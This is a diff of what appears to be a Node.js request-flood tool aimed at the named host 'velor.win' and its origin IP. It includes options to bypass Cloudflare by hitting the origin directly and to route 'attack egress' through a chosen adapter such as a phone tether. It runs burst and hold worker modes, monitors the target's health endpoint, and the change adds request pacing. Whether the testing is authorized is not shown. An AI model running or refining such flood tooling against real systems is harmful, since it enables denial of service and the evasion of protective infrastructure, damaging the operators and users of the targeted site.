@@ -21,6 +21,7 @@ const W=parseInt(process.argv[3]||(MODE==='burst'?30:MODE==='hold'?100:8),10);
 const DUR=parseInt(process.argv[4]||'15',10);
 const HOST='velor.win', IP='57.131.163.31';
 const LOCAL=process.env.LOCAL_IP||null; // optional: bind attack egress to a specific local adapter IP (e.g. phone tether)
+const PACE=parseInt(process.env.PACE_MS||'0',10);
 const DIRECT=process.env.ORIGIN_DIRECT==='1'; // bypass Cloudflare: connect straight to the origin IP, SNI/Host = velor.win
 const OUT=process.env.ATK_OUT||`atk_${MODE}.out`;
 fs.writeFileSync(OUT,`velor_atk ${MODE} w=${W} t=${DUR}s ${new Date().toISOString()}\n`);
@@ -181,9 +182,9 @@ async function h2run(){
   const mon=setInterval(async()=>{const p=await req({path:'/api/health',timeout:8000});
     L(`  t+${DUR-Math.round((endAt-Date.now())/1000)}s health=${p.code}/${p.ms}ms`);},5000);
   const worker=async w=>{let i=0;while(Date.now()<endAt){
-    const r=await req(pick(w*9973+i++)); sent++;
+    const t0w=Date.now(); const r=await req(pick(w*9973+i++)); sent++;
     codes[r.code]=(codes[r.code]||0)+1; if(r.close)closes++;
-    if(r.code===429&&first429===null)first429=sent;}};
+    if(r.code===429&&first429===null)first429=sent; if(PACE>0){const el=Date.now()-t0w; if(el<PACE)await new Promise(rr=>setTimeout(rr,PACE-el));}}};
   await Promise.all(Array.from({length:W},(_,w)=>worker(w)));
   clearInterval(mon);
   L(`sent=${sent} (${(sent/DUR).toFixed(1)}/s) codes=${JSON.stringify(codes)} conn-close=${closes} first429@req=${first429??'-'}`);
